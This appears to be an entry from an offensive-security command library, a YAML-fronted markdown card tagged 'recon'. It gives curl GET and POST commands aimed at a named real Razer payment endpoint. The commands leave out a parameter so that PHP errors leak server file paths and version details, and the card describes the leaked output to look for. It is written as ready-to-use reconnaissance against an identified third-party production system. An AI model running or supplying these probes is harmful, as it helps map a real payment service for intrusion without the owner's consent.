---
id: cmd-uuid-456
data: >-
  curl -X GET
  "https://sea-web.gold.razer.com/lab/cash-card-incomplete-translog-resend" -v
tags:
  - recon
  - web
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.209Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-php-error

## Command

```bash
curl -X GET "https://sea-web.gold.razer.com/lab/cash-card-incomplete-translog-resend" -v
```

## Description

This command uses curl to send a GET request to the vulnerable Razer cash card transaction resend endpoint without the 'period-hour' parameter, triggering a PHP undefined index error and disclosing internal server details. Use it for quick reconnaissance of information disclosure vulnerabilities in PHP applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| URL | Target endpoint URL | Yes |
| `-v` | Verbose mode to show headers and details | Yes for debugging |

## Examples

### Basic Usage

```bash
curl -X GET "https://sea-web.gold.razer.com/lab/cash-card-incomplete-translog-resend" -v
```

### Advanced Usage

```bash
curl -X POST "https://sea-web.gold.razer.com/lab/cash-card-incomplete-translog-resend" -d "" -v
```

Use POST with empty data if the endpoint expects form submission.

## Expected Output

Verbose curl output including request/response headers, followed by the HTML response body containing PHP error messages, e.g., "<title>Some error has occurred! | Pay With Razer</title>" and "Notice: Undefined index: period-hour in /var/www/html/file.php on line 123". Look for file paths, PHP version hints, or other leaks.

## Related

- [[Related Procedure|procedures/Trigger-PHP-Error-Disclosure-on-Razer-Cash-Card-Endpoint]]
